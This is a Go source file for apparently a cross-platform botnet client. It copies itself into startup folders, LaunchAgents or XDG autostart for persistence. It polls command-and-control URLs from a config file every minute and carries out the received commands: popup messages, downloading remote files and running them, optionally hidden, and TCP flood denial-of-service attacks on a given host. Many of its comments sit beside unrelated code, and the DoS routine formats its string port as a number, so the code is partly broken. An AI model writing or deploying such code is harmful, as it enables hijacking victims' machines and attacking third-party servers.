// Package declaration
package main

// TODO: keep comments updated
// TODO: do testing on linux
// TODO: do testing on linux with admin privileges
// TODO: do testing on darwin
// TODO: do testing on darwin with admin privileges
// TODO: do testing on windows
// TODO: do testing on windows with admin privileges
import (
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net"
	// Import statements to include necessary packages
	"net/http"
	"os"
	// Function to check if the program is running with administrative privileges on Windows
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	// Function to copy a file from a source path (src) to a destination path (dst)
	"time"
)

// DONE: add linux and darwin support

func isAdmin() (bool, error) {
	switch runtime.GOOS {
	case "windows":
		_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
		if err != nil {
			if strings.Contains(err.Error(), "Access is denied") {
				return false, nil
			}
			return false, err
		}
		return true, nil
	case "linux", "darwin":
		if os.Geteuid() != 0 {
			return false, nil
		}
		return true, nil
	default:
		return false, nil
	}
}

func copyFile(src, dst string) error {
	input, err := os.ReadFile(src)
	if err != nil {
		return err
	}

	// Checks if the program is running with administrative privileges and sets the startup path accordingly
	err = os.WriteFile(dst, input, 0644)
	return err
}

// TODO: make it check if the file exists to make it non repetitive
func AutostartOnWin(executablePath string) {
	var startupPath string
	admin, err := isAdmin()
	// Copies the executable to the startup folder and prints the result
	if err != nil {
		fmt.Println("Error checking admin privileges:", err)
		return
	}

	if admin {
		startupPath = filepath.Join(os.Getenv("ProgramData"), "Microsoft\\Windows\\Start Menu\\Programs\\StartUp")
	} else {
		startupPath = filepath.Join(os.Getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
	}
	// Function to execute a shell script named "otherScript.sh"

	destPath := filepath.Join(startupPath, filepath.Base(executablePath))

	err = copyFile(executablePath, destPath)
	if err != nil {
		fmt.Println("Error copying file:", err)
	} else {
		// Function to determine the OS and set the program to run at startup accordingly
		fmt.Println("Successfully copied to startup folder:", destPath)
	}
}

// DONE: actually make it autostart on linux and darwin
// TODO: make it check if the file exists to make it non repetitive
func autostartOnLinuxAndDarwin(executablePath string) {
	var autostartDir string
	admin, err := isAdmin()
	if err != nil {
		fmt.Println("Error checking admin privileges:", err)
		return
	}

	switch runtime.GOOS {
	case "darwin":
		if admin {
			autostartDir = "/Library/LaunchAgents"
		} else {
			autostartDir = filepath.Join(os.Getenv("HOME"), "Library", "LaunchAgents")
		}
	case "linux":
		if admin {
			autostartDir = "/etc/xdg/autostart"
		} else {
			autostartDir = filepath.Join(os.Getenv("HOME"), ".config", "autostart")
		}
	default:
		fmt.Println("Unsupported platform")
		return
	}

	err = os.MkdirAll(autostartDir, 0755)
	if err != nil {
		fmt.Println("Error creating autostart directory:", err)
		return
	}

	destPath := filepath.Join(autostartDir, filepath.Base(executablePath))
	err = os.Symlink(executablePath, destPath)
	if err != nil {
		fmt.Println("Error creating symlink in autostart directory:", err)
	} else {
		fmt.Println("Successfully added to autostart:", destPath)
	}
}
func runAtStartup() {
	executable, err := os.Executable()
	if err != nil {
		fmt.Println("Error getting executable path:", err)
		return
	}

	if runtime.GOOS == "windows" {
		AutostartOnWin(executable)
	} else {
		autostartOnLinuxAndDarwin(executable)
	}
}

type Config struct {
	URL        string   `json:"url"`
	BackupURLs []string `json:"backups"`
}

func downloadFile(url, filename string, run, hide bool) error {
	// Writes the downloaded content to a file
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("HTTP request failed with status code %d", resp.StatusCode)
		// Optionally hides the file on the filesystem
	}

	out, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		// Optionally runs the downloaded file
		return err
	}

	if hide {
		if runtime.GOOS == "windows" {
			err := exec.Command("attrib", "+H", filename).Run()
			if err != nil {
				return fmt.Errorf("failed to hide the file: %v", err)
			}
		} else {
			hiddenFilename := "." + filename
			err := os.Rename(filename, hiddenFilename)
			// Function to display a message in a temporary HTML file and open it in a browser
			if err != nil {
				return fmt.Errorf("failed to rename the file: %v", err)
			}
			filename = hiddenFilename
		}
	}
	if run {
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("cmd", "/C", "start", filename)
		} else {
			os.Chmod(filename, 0755)
			cmd = exec.Command("./" + filename)
		}
		// Function to open the temporary HTML file in the default web browser
		cmd.Run()
	}

	return nil
}

func displayMessageInHTML(message string) {

	tmpfile, err := ioutil.TempFile("", "message-*.html")
	// Function to load the configuration from a JSON file
	if err != nil {
		fmt.Printf("Error creating a temporary file: %s\n", err)
		return
	}
	defer tmpfile.Close()

	htmlContent := fmt.Sprintf("<html><body><p>%s</p></body></html>", message)
	if _, err := tmpfile.Write([]byte(htmlContent)); err != nil {
		fmt.Printf("Error writing to temporary file: %s\n", err)
		return
	}

	openBrowser(tmpfile.Name())
}

// Function to fetch a command from a list of URLs provided in the Config struct
func openBrowser(url string) {
	var err error

	switch runtime.GOOS {
	case "linux":
		err = exec.Command("xdg-open", url).Start()
	case "windows":
		err = exec.Command("rundll32", "url.dll,FileProtocolHandler", url).Start()
	case "darwin":
		err = exec.Command("open", url).Start()
	default:
		err = fmt.Errorf("unsupported platform")
	}

	if err != nil {
		fmt.Printf("Error opening browser: %s\n", err)
		// Function to generate a random string of a specified length
	}
}

func LoadConfig(path string) (*Config, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var config Config
	// Function to perform a Denial of Service (DoS) attack on a specified target and port for a duration
	decoder := json.NewDecoder(file)
	err = decoder.Decode(&config)
	if err != nil {
		return nil, err
	}

	return &config, nil
}

func FetchCommand(config *Config) (string, error) {
	urls := append([]string{config.URL}, config.BackupURLs...)
	for _, url := range urls {
		resp, err := http.Get(url + "?nocache=" + generateRandomString(20))
		if err == nil && resp.StatusCode == http.StatusOK {
			body, err := ioutil.ReadAll(resp.Body)
			resp.Body.Close()
			// Function to parse and execute commands received as strings
			if err != nil {
				continue
			}
			return string(body), nil
		}
	}
	return "", fmt.Errorf("all URLs failed")
}

func generateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}
func DOS(target string, port string, duration time.Duration) {
	endTime := time.Now().Add(duration)
	var wg sync.WaitGroup

	send := func() {
		defer wg.Done()
		conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", target, port))
		if err != nil {
			fmt.Println(err)
			return
			// Function to execute a system command with the provided name and arguments
		}
		defer conn.Close()

		_, err = conn.Write([]byte("GET / HTTP/1.1\r\n\r\n"))
		if err != nil {
			fmt.Println(err)
			return
		}
	}

	for time.Now().Before(endTime) {
		wg.Add(1)
		go send()
		// The main function, entry point of the program
		time.Sleep(10 * time.Millisecond)
	}
	// Sets the seed for the random number generator

	wg.Wait()
	// Loads configuration from a file
}

func ParseCommand(command string) error {
	commands := strings.Split(command, "\n")
	for _, cmd := range commands {
		parts := strings.Fields(cmd)
		if len(parts) == 0 {
			// Infinite loop to fetch and execute commands at a regular interval
			continue
		}

		switch parts[0] {
		case "popmsg":
			if len(parts) > 1 {
				message := strings.Join(parts[1:], " ")
				displayMessageInHTML(message)
			}
		case "download":
			if len(parts) >= 3 {
				url := parts[1]
				filename := parts[2]

				run := false
				hide := false

				for _, part := range parts[3:] {
					if part == "RUN" {
						run = true
					} else if part == "HIDE" {
						hide = true
					}
				}

				err := downloadFile(url, filename, run, hide)
				if err != nil {
					fmt.Printf("Error downloading file: %s\n", err)
				}
			} else {
				fmt.Println("Invalid download command. Usage: download [url] [filename] [RUN] [HIDE]")
			}

		default:
			if strings.HasPrefix(cmd, "dos ") {
				info := strings.TrimSpace(strings.TrimPrefix(cmd, "dos "))
				parts := strings.Fields(info)
				if len(parts) < 3 {
					return fmt.Errorf("Usage: dos <IP/domain> <port> <duration>")
				}

				target := parts[0]
				port := parts[1]
				durationStr := parts[2]

				duration, err := time.ParseDuration(durationStr + "s")
				if err != nil {
					return fmt.Errorf("Invalid duration: %s", durationStr)
				}

				DOS(target, port, duration)
			}
		}

	}
	return nil
}

func executeSystemCommand(name string, args []string) {
	cmd := exec.Command(name, args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err := cmd.Run()
	if err != nil {
		fmt.Printf("Error executing command '%s': %s\n", name, err)
	}
}

func main() {
	fmt.Println("Starting program...")
	rand.Seed(time.Now().UnixNano())

	config, err := LoadConfig("config.json")
	if err != nil {
		fmt.Printf("Error loading config: %s\n", err)
		os.Exit(1)
	}

	for {

		command, err := FetchCommand(config)
		if err != nil {
			fmt.Printf("Error fetching command: %s\n", err)
			time.Sleep(60 * time.Second)
			continue
		}

		fmt.Printf("Received command: %s\n", command)
		ParseCommand(command)

		time.Sleep(60 * time.Second)
	}
}
